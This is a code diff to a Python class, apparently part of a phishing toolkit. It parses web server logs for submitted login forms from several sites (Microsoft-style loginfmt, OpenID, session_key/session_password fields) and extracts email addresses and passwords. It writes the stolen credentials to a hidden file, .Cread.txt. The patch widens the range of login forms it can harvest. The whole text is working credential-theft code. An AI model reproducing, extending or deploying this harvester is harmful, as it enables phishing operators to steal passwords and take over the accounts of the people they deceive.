@@ -25,23 +25,63 @@ class dns_result :
           with open(Path_St+'/ServerLog/log_error.log') as Log_Handel :
               Log_read = Log_Handel.readlines()
           for line in Log_read:     
-              if '%40'in  line  : 
-                if "username" in line  or "key1" in line:
-                   line = line.split('=')                
-                else:
-                     line  = line.split('&')  
-                line_split = str(line[1:3]).split('+&password')
-                line_cread = str("".join(line_split)).replace('+&password',' ').replace('&captcha_text',' ')\
+              if '%40'in  line :
+
+                if "username" in line  or "key1" in line or "loginfmt" in line :
+                      line  =  line.split('=')
+                     
+                      if "false&time_to_submit"  in line or  "&embed" in line :
+                           line = line[-4:]
+                      elif "0&commit" in line:
+                            line = line[-4:]
+                            line.insert(0,'oo') 
+
+                elif "openid.identity=" in line    :
+                     line  = line.split('=')
+                     line = line[-4:]
+                     if "true" in line[-1] :
+                         line.remove(line[-1]) 
+                         line.insert(0,'fff')
+                         line.remove(line[-2]) 
+                     else:    
+                         line.remove(line[-2]) 
+
+                elif   "from=mail"  in line  :
+                        line  = line.split('=')
+                        line = line[-3:]
+
+                else:                 
+                      if "withFields=" in line  or "&cid=" in line\
+                      or  "email=" in line :  
+                          line  = line.split('=')
+                          if "on&pageId" in line :
+                            line=line[2:5]
+                            line.insert(0,'fff')
+                          else:   
+                             line=line[1:3]
+                             line = str("".join(line)).split('&')
+                             line.insert(0,'uuu')
+
+                      else:                         
+                          line  = line.split('&')
+
+                                    
+                line_split = str(line[1:3]).split('password')  
+                line_cread = str("".join(line_split)).replace("&",'').replace('+',"").replace('&password',' ').replace('&captcha_text',' ')\
                 .replace("+&session_password=1",'').replace("&session_key ",'').replace('session_key=','')\
-                .replace("+",'').replace(",",'').split()
+                .replace("+",'').replace(",",'').replace("&create",'').replace("&passwd",'').replace("user%5Bremember_me%5D",'').replace("key1",'')\
+                .replace("passwd",'').replace("create",'').split()
+
                 line_cread_1 = str("".join(line_cread[0])).replace("['",'').replace("'",'')\
                 .replace('%40','@').replace("&password",'').replace('+&key1','').replace('&key1','')\
-                .replace('&session_password=1','').replace("&session_key",'').replace("session_password=",'').replace(",",'')
+                .replace('&session_password=1','').replace("&session_key",'').replace("session_password=",'').replace("user%5Bremember_me%5D",'').replace(",",'')
                 try: 
                     line_cread_2 = str("".join(line_cread[1])).replace("]",'')\
                     .replace("']",'').replace("'",'').replace('\\n','').replace("&signIn",'')\
                     .replace('&isJsEnabled','').replace("&session_key=",'').replace('&session_password=1','')\
-                    .replace("+&session_password",'').replace("session_password=",'').replace(",",'').strip()  
+                    .replace("+&session_password",'').replace("session_password=",'').replace(",",'')\
+                    .replace("&ps",'').replace("&rememberMe",'').replace("password",'').replace("signIn",'').replace('session_=','')\
+                    .replace("captcha_text",'').replace("remember",'').replace("ps",'').replace("Me",'').strip()  
                     with open (Path_St+'/ServerLog/.Cread.txt','a') as Cread_User :
                         if line_cread_1 == "":
                               Cread_User.write("---------"+'\n'+line_cread_2.replace("%40",'@')+'\n')
